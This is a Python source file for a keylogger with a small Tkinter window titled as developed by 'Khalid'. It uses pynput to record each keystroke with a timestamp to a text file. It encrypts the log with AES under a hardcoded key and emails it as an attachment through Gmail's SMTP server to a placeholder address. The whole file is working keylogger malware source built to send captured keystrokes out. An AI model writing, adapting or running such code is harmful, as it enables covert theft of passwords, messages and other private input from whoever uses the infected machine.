
import os
import sys
import time
from pynput import keyboard
from datetime import datetime
from tkinter import Tk, Label, Button
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Files
log_file = "keylog.txt"
enc_file = "encrypted_log.bin"
encryption_key = b"ThisIsA16ByteKey"  # 16-byte key for AES

# === AES Encryption ===
def encrypt_log(input_file, output_file, key=encryption_key):
    if not os.path.exists(input_file):
        return
    with open(input_file, "rb") as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    with open(output_file, "wb") as f:
        f.write(cipher.iv + ct_bytes)

# === Email Sending ===
def send_email(filename):
    sender = "youremail@example.com"
    password = "yourpassword"
    recipient = "recipient@example.com"
    
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = "Encrypted Keylog File"

    try:
        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename= {filename}")
            msg.attach(part)
    except FileNotFoundError:
        print("Encrypted file not found.")
        return

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender, password)
    server.send_message(msg)
    server.quit()

# === Keylogger Logic ===
def on_press(key):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(log_file, "a") as file:
            file.write(f"[{timestamp}] {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"[{timestamp}] [{key}]\n")

def start_keylogger():
    loading_label.config(text="Encrypting previous logs...")
    root.update()
    encrypt_log(log_file, enc_file)
    time.sleep(1)

    loading_label.config(text="Sending logs to email...")
    root.update()
    send_email(enc_file)
    time.sleep(1)

    loading_label.config(text="Keylogger is now running...")
    root.update()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# === GUI ===
root = Tk()
root.title("Keylogger by Khalid")
root.geometry("450x250")
root.configure(bg="black")

title = Label(root, text="Keylogger Developed by Khalid", fg="lime", bg="black", font=("Courier", 16))
title.pack(pady=25)

start_button = Button(root, text="Start Logger", command=start_keylogger, bg="lime", fg="black", font=("Courier", 12))
start_button.pack(pady=10)

loading_label = Label(root, text="", fg="white", bg="black", font=("Courier", 10))
loading_label.pack()

root.mainloop()
